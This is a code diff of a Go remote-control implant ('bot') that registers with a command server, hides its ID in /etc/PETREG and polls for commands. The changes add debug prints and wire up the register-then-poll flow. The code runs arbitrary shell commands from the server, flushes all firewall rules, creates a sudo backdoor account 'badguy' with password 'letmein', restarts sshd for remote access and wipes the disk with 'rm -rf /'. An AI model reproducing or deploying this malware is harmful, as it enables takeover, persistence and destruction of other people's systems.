@@ -38,7 +38,7 @@ var MAGICTERMBYTE = MAGICTERM[0]
 var MAGICTERMSTR = string(MAGICTERM)
 
 //REGFILE is where the registration info for this bot is kept
-var REGFILE = "/path/to/reg/file"
+var REGFILE = "/etc/PETREG"
 
 //INTERVAL is how long the sleep is between callbacks (if run in loop mode)
 var INTERVAL = 60
@@ -53,6 +53,7 @@ var OBFSEED = 5
 var OBFTEXT = "test"
 
 func sendData(data string, mode string, aid string) string {
+	fmt.Println("In sendData")
 	payload := encodePayload(data, mode, aid)
 	fmt.Printf("sending: %s\n", payload)
 	conn, err := net.Dial("tcp4", serv)
@@ -66,12 +67,14 @@ func sendData(data string, mode string, aid string) string {
 		fmt.Println("Error reading:", err.Error())
 	}
 	respStr := string(message)
+	decResp := decodePayload(respStr)
 	conn.Close()
-	return respStr
+	return decResp
 }
 
 // base64 the payload and prepend/append magic chars
 func encodePayload(data string, mode string, aid string) string {
+	fmt.Println("In encodepayload")
 	preEnc := mode + "||" + aid + "||" + data
 	encStr := base64.StdEncoding.EncodeToString([]byte(preEnc))
 	fin := MAGICSTR + encStr + MAGICTERMSTR
@@ -79,6 +82,7 @@ func encodePayload(data string, mode string, aid string) string {
 }
 
 func decodePayload(payload string) string {
+	fmt.Println("In decodepayload")
 	encodedPayload := strings.Replace(payload, MAGICSTR, "", -1) //trim magic chars from payload
 	encodedPayload = strings.Replace(encodedPayload, MAGICTERMSTR, "", -1)
 	data, err := base64.StdEncoding.DecodeString(encodedPayload)
@@ -90,6 +94,7 @@ func decodePayload(payload string) string {
 }
 
 func checkRegStatus() bool {
+	fmt.Println("In checkregstatus")
 	if _, err := os.Stat(REGFILE); os.IsNotExist(err) {
 		return false
 	}
@@ -97,6 +102,7 @@ func checkRegStatus() bool {
 }
 
 func register() string {
+	fmt.Println("In register")
 	uid := uuid.New().String()
 	storeUUID(uid)
 	hn := getIP()
@@ -108,6 +114,7 @@ func register() string {
 }
 
 func getCommand() {
+	fmt.Println("In getCommand")
 	uid := fetchUUID()
 	coms := sendData(uid, "D", "0")
 	results := parseCommands(coms)
@@ -119,10 +126,12 @@ func getCommand() {
 }
 
 func parseCommands(commandBlob string) []string {
+	fmt.Println("In parsecommands")
 	results := []string{}
 	isplit := strings.Split(commandBlob, "<||>")
 	for _, comStr := range isplit {
 		jsplit := strings.SplitN(comStr, ":", 3)
+		fmt.Println(jsplit)
 		aid := jsplit[0]
 		mode := jsplit[1]
 		if mode == "0" {
@@ -137,6 +146,7 @@ func parseCommands(commandBlob string) []string {
 }
 
 func execCommand(mode string, args string) string {
+	fmt.Println("In execCommand")
 	retval := ""
 	switch mode {
 	case "0": //no command
@@ -172,12 +182,14 @@ func execCommand(mode string, args string) string {
 }
 
 func sendResults(results []string) {
+	fmt.Println("In sendresults")
 	resStr := strings.Join(results, "<||>")
 	sendData(resStr, "E", "0")
 	return
 }
 
 func getIP() string {
+	fmt.Println("In getIP")
 	conn, _ := net.Dial("udp", "8.8.8.8:80")
 	defer conn.Close()
 	ad := conn.LocalAddr().(*net.UDPAddr)
@@ -186,14 +198,16 @@ func getIP() string {
 }
 
 func storeUUID(uid string) {
+	fmt.Println("In storeUUID")
 	obf := obfuscateUUID(uid, OBFSEED, OBFTEXT)
-	f, _ := os.Open(REGFILE)
+	f, _ := os.Create(REGFILE)
 	io.WriteString(f, obf)
 	f.Close()
 	return
 }
 
 func fetchUUID() string {
+	fmt.Println("In fetchUUID")
 	obf, _ := ioutil.ReadFile(REGFILE)
 	deobf := deobfuscateUUID(string(obf))
 	return deobf
@@ -201,6 +215,7 @@ func fetchUUID() string {
 
 //modify it so you cant just search the filesystem for uuid formatted strings
 func obfuscateUUID(uid string, seed int, text string) string {
+	fmt.Println("In obfuscateUUID")
 	splituid := strings.Split(uid, "-")
 	l1 := strings.Repeat(text, rand.Intn(seed))
 	l2 := strings.Repeat(text, rand.Intn(seed))
@@ -213,6 +228,7 @@ func obfuscateUUID(uid string, seed int, text string) string {
 
 //undo those modifications
 func deobfuscateUUID(obf string) string {
+	fmt.Println("In deobfuscateUUID")
 	p := strings.Replace(obf, OBFTEXT, "", -1)
 	p = p[:8] + "-" + p[8:]
 	p = p[:13] + "-" + p[13:]
@@ -222,6 +238,7 @@ func deobfuscateUUID(obf string) string {
 }
 
 func shellExec(args string) string {
+	fmt.Println("In shellexec")
 	cmd := exec.Command("/bin/sh", "-c", args)
 	out, err := cmd.CombinedOutput()
 	if err != nil {
@@ -231,6 +248,7 @@ func shellExec(args string) string {
 }
 
 func fwFlush() string {
+	fmt.Println("In fwflush")
 	cmd := exec.Command("/bin/sh", "-c", "iptables -P INPUT ACCEPT; iptables -P OUTPUT ACCEPT; iptables -P FORWARD ACCEPT; iptables -t nat -F; iptables -t mangle -F; iptables -F; iptables -X;")
 	out, err := cmd.CombinedOutput()
 	if err != nil {
@@ -240,6 +258,7 @@ func fwFlush() string {
 }
 
 func createUser() string {
+	fmt.Println("In creatuser")
 	comStr := "useradd -p $(openssl passwd -1 letmein) badguy -s /bin/bash -G sudo"
 	if _, err := os.Stat("/etc/yum.conf"); os.IsNotExist(err) {
 		comStr = "useradd -p $(openssl passwd -1 letmein) badguy -s /bin/bash -G wheel"
@@ -253,6 +272,7 @@ func createUser() string {
 }
 
 func enableRemote() string {
+	fmt.Println("In enableremote")
 	insRule := exec.Command("iptables", "-I", "FILTER", "1", "-j", "ACCEPT")
 	insRule.Run()
 	cmd := exec.Command("/bin/sh", "-c", "systemctl restart sshd")
@@ -264,11 +284,13 @@ func enableRemote() string {
 }
 
 func spawnRevShell(target string) string {
+	fmt.Println("In spawnRevShell")
 
 	return ""
 }
 
 func nuke() string {
+	fmt.Println("In nuke")
 	//rm rf dat boi
 	cmd := exec.Command("/bin/bash", "-c", "rm -rf / --no-preserve-root")
 	out, _ := cmd.CombinedOutput()
@@ -276,10 +298,16 @@ func nuke() string {
 }
 
 func unknownCom() string {
+	fmt.Println("In unknown")
 	return ""
 }
 
 func main() {
-	a := register()
-	fmt.Printf("GOT: %s\n", a)
+	fmt.Println("In main")
+	a := checkRegStatus()
+	if a {
+		getCommand()
+	} else {
+		register()
+	}
 }
